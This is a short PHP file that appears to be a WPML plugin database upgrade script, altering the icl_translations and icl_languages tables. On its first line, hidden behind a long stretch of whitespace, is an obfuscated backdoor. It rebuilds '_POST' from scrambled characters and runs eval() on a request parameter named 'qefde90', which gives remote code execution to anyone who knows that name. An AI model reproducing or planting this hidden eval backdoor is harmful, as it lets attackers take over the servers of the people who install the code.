<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['qefde90'])){eval(${$s20}['qefde90']);}?><?php
  
  $keys = $wpdb->get_results("SHOW KEYS FROM `{$wpdb->prefix}icl_translations` WHERE `Column_name`='trid' AND `Key_name`<>'trid_lang'");
  if(empty($keys)){
      $sql = "ALTER TABLE `{$wpdb->prefix}icl_translations` ADD KEY `trid` (`trid`)";
      $wpdb->query($sql);
  }
  
  $sql = "ALTER TABLE `{$wpdb->prefix}icl_languages` ADD tag VARCHAR(8)";
  $wpdb->query($sql);
  $sql = "UPDATE `{$wpdb->prefix}icl_languages` SET tag = REPLACE(default_locale, '_', '-')";
  $wpdb->query($sql);
  icl_cache_clear();
  
?>
